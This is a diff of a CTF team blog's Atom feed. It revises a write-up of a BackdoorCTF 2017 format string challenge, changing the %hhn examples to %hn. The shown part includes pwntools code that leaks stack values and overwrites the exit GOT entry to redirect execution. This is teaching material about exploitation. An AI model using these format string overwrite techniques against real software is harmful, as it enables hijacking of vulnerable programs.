@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://teamrocketist.github.io/"/>
-  <updated>2017-09-25T04:54:35.274Z</updated>
+  <updated>2017-09-26T05:40:23.592Z</updated>
   <id>https://teamrocketist.github.io/</id>
   
   <author>
@@ -20,7 +20,7 @@
     <link href="https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/"/>
     <id>https://teamrocketist.github.io/2017/09/25/Pwn-BackdoorCTF-2017-baby0x41414141/</id>
     <published>2017-09-25T04:46:07.000Z</published>
-    <updated>2017-09-25T04:54:35.274Z</updated>
+    <updated>2017-09-26T05:40:23.592Z</updated>
     
     <content type="html"><![CDATA[<p><a data-fancybox="gallery" href="https://i.imgur.com/pX6qbFQ.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/pX6qbFQ.png" alt=""><br></a><br><em>1.1 - format string vulnerability.</em></p>
 <p>We have a format string vulnerability we can confirm this by running the binary:</p>
@@ -31,16 +31,16 @@
 <p>Before going into an explanation I’ll show you some modifiers from <code>printf</code> man page this will be useful since we want to override a certain number of bytes and this length modifiers will help us on that.</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">An optional length modifier, that specifies the size of the argument.</div><div class="line">         The following length modifiers are valid for the d, i, n, o, u, x, or</div><div class="line">         X conversion:</div><div class="line"></div><div class="line">         Modifier          d, i           o, u, x, X            n</div><div class="line">         hh                signed char    unsigned char         signed char *</div><div class="line">         h                 short          unsigned short        short *</div><div class="line">         l (ell)           long           unsigned long         long *</div><div class="line">         ll (ell ell)      long long      unsigned long long    long long *</div><div class="line">         j                 intmax_t       uintmax_t             intmax_t *</div><div class="line">         t                 ptrdiff_t      (see note)            ptrdiff_t *</div><div class="line">         z                 (see note)     size_t                (see note)</div><div class="line">         q (deprecated)    quad_t         u_quad_t              quad_t *</div></pre></td></tr></table></figure>
 <p>For example if we want to override an address like this <code>0x0804870b</code> this a 32 bit address so if we need to change all the bits we would use <code>%ln</code> which is a long and it’s 32 bits or we could even use <code>%lln</code> would work too since is 64 bit (long long). </p>
-<p>Usually we want to use <code>%hhn</code> so we can override 4 bytes in 4 bytes if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hhn the address but this time we need to do it in two operations instead of one.</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hhn'</span></div><div class="line">870b -&gt; <span class="string">'%10hhn'</span></div></pre></td></tr></table></figure>
+<p>Usually we want to use <code>%hn</code> so we can override 2 bytes(16 bits) at each if we get greedy and try to override it as long when the binary prints the string output it will take a lot of time since it needs <code>0x0804870b</code> spaces to be printed, this is why we prefer to use %hn the address but this time we need to do it in two operations instead of one.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">0804 -&gt; <span class="string">'%11hn'</span></div><div class="line">870b -&gt; <span class="string">'%10hn'</span></div></pre></td></tr></table></figure>
 <h3 id="Stack-address-offset-calculation"><a href="#Stack-address-offset-calculation" class="headerlink" title="Stack address offset calculation"></a>Stack address offset calculation</h3><p>We can do this by printing a bunch of addresses from the stack using <code>%x</code> or <code>%p</code>, we can insert some ‘AAAA’ in the beginning and the a bunch of <code>%x</code> and check on which location the ‘AAAA’ are positioned in the stack.</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">return</span> process(<span class="string">'./32_new'</span>) <span class="keyword">if</span> local <span class="keyword">else</span> remote(<span class="string">'163.172.176.29'</span>, <span class="number">9035</span>)</div><div class="line">r =getConn()</div><div class="line">r.recvuntil(<span class="string">'Hello baby pwner, whats your name?\n'</span>)</div><div class="line">s = <span class="string">'AAAA'</span>+ <span class="string">'%x,'</span>*<span class="number">20</span></div><div class="line">r.sendline(s)</div></pre></td></tr></table></figure>
 <p>We can see our <code>41414141</code> will appear in the position 10th, we now know where its located in the stack when we put some strings in the beginning: </p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">$ python 32_new.py </div><div class="line">Ok cool, soon we will know whether you pwned it or not. Till then Bye AAAA8048914,ff92ee98,1,f745c618,36e,f7462668,ff92f144,ff92eee4,ff92eee0,41414141,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,78252c78,2c78252c,252c7825,</div></pre></td></tr></table></figure>
 <p>To access its position we can do like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hhn'</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%10$hn'</span></div></pre></td></tr></table></figure>
 <h3 id="Override-exit-function"><a href="#Override-exit-function" class="headerlink" title="Override exit function"></a>Override exit function</h3><p>Now we need to calculate how much characters we need to add into our format expression, for example we needed 100 we can do it like this:</p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hhn'</span></div></pre></td></tr></table></figure>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="string">'%100%10$hn'</span></div></pre></td></tr></table></figure>
 <p>Now starting the exploit we can easily get the exit <code>GOT</code> address with <code>pwntools</code> and the flag function we can get it from radare2 you can check it at the picture 1.2 above.</p>
 <p>One nice trick is to clear the existing <code>EXIT</code> function address with <code>%10$lln</code> of course since we are adding some characters at the begining of the string the address won’t be converted to 0 in this case it actually turned into <code>0x0000004e</code>, 0x4e is 78 in decimal and that’s why I’m subtracting in the 78! And there is another thing that is very cleaver is to split the address in half with some bit operations with this we know exactly which characters to add (of course you still need to do some debugging in <code>gdb</code>).</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">EXIT_GOT = binary.got[<span class="string">'exit'</span>]</div><div class="line"></div><div class="line">FLAG_LOW = FLAG &amp; <span class="number">0xffff</span></div><div class="line">FLAG_HIGH = (FLAG &amp; <span class="number">0xffff0000</span>) &gt;&gt; <span class="number">16</span></div><div class="line"></div><div class="line">s = p32(EXIT_GOT)</div><div class="line">s += p32(EXIT_GOT+<span class="number">2</span>)</div><div class="line">s += <span class="string">'%10$lln'</span> <span class="comment"># clears the already existing exit address</span></div><div class="line">s += <span class="string">'%&#123;&#125;x%11$hn'</span>.format(FLAG_HIGH<span class="number">-78</span>)</div><div class="line">s += <span class="string">'%&#123;&#125;x%10$hn'</span>.format(FLAG_LOW-FLAG_HIGH)</div></pre></td></tr></table></figure>
@@ -57,9 +57,9 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="formatString" scheme="https://teamrocketist.github.io/tags/formatString/"/>
     
@@ -112,8 +112,6 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
       <category term="ROP" scheme="https://teamrocketist.github.io/tags/ROP/"/>
@@ -121,6 +119,8 @@
       <category term="retToLibc" scheme="https://teamrocketist.github.io/tags/retToLibc/"/>
     
       <category term="backdoorctf" scheme="https://teamrocketist.github.io/tags/backdoorctf/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
@@ -195,9 +195,9 @@
     
       <category term="csaw" scheme="https://teamrocketist.github.io/tags/csaw/"/>
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="shellcode" scheme="https://teamrocketist.github.io/tags/shellcode/"/>
     
@@ -410,9 +410,9 @@
       <category term="Web" scheme="https://teamrocketist.github.io/categories/Web/"/>
     
     
-      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
-    
       <category term="web" scheme="https://teamrocketist.github.io/tags/web/"/>
+    
+      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
     
       <category term="pythonserver" scheme="https://teamrocketist.github.io/tags/pythonserver/"/>
     
@@ -751,11 +751,11 @@
     
       <category term="rop" scheme="https://teamrocketist.github.io/tags/rop/"/>
     
+      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
       <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
       <category term="ret2libc" scheme="https://teamrocketist.github.io/tags/ret2libc/"/>
-    
-      <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
     
   </entry>
   
@@ -952,9 +952,9 @@
       <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
     
     
-      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
-    
       <category term="bufferOverflow" scheme="https://teamrocketist.github.io/tags/bufferOverflow/"/>
+    
+      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
     
   </entry>
   
